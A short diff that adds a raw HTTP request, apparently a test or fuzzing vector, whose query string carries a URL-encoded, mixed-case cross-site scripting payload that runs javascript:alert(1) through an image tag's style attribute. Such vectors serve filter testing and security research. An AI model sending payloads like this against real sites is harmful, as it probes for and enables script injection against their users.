@@ -1,0 +1,4 @@
+GET /a?s=<iMg%20SrC%3D1%20sTyLe%3D"BaCkGrOuNd:UrL(jAvAsCrIpT:aLeRt(1))"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
